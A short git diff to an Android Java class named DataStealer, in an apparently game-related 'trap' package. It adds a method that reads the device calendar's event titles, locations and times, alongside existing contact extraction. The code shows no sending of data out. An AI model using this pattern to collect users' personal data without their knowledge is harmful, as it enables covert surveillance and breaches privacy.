@@ -2,11 +2,14 @@ package de.hpi3d.gamepgrog.trap;
 
 import android.content.Context;
 import android.database.Cursor;
+import android.provider.CalendarContract;
 import android.provider.ContactsContract;
 import android.provider.ContactsContract.Profile;
+import android.provider.CalendarContract.Events;
 
 import java.util.ArrayList;
 
+import de.hpi3d.gamepgrog.trap.datatypes.CalendarEvent;
 import de.hpi3d.gamepgrog.trap.datatypes.Contact;
 
 
@@ -52,6 +55,34 @@ public class DataStealer {
 
         return extractedContacts;
     }
+
+    public static ArrayList<CalendarEvent> takeCalendarData(Context context){
+
+        String[] projection = new String[]{
+                Events._ID,
+                Events.TITLE,
+                Events.EVENT_LOCATION,
+                Events.DTSTART,
+                Events.DTEND
+        };
+
+        Cursor cursor = context.getContentResolver().query(
+                CalendarContract.Events.CONTENT_URI,
+                projection,
+                null,
+                null,
+                null);
+
+        ArrayList<CalendarEvent> cEvents = CalendarEvent.createFromCursor(cursor);
+
+
+
+
+        return cEvents;
+
+    }
+
+
 
 
 }
